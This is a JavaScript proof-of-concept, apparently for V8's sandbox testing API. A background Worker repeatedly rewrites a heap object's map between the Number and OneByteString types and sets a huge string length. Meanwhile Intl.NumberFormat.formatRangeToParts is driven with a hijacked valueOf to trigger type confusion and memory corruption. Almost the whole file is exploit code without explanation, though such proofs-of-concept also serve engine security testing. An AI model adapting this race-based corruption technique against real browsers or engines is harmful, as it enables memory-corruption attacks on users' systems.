let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
var val = -0.0;

function corruptInBackground(address) {
    function workerTemplate(address) {
        let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
        while (true) {
            // static root: Number map
            memory.setUint32(address, 0x515, true);
            // set the string length
            memory.setUint32(address + 8, 0x7fffffff, true);
            // static root: OneByteString map
            memory.setUint32(address, 0xb5, true);
        }
    }
    const workerCode = new Function(
        `(${workerTemplate})(${address})`);
    return new Worker(workerCode, { type: 'function' });
}

let addr = Sandbox.getAddressOf(val);
corruptInBackground(addr);

function f3(a4, a5) {
    return val;
}
Float32Array.valueOf = f3;

while(1) {
    try {
    const t4 = constructor().Intl.NumberFormat;
    t4().formatRangeToParts(Float32Array, 59);
    } catch (e) {
        print(e);
    }
}
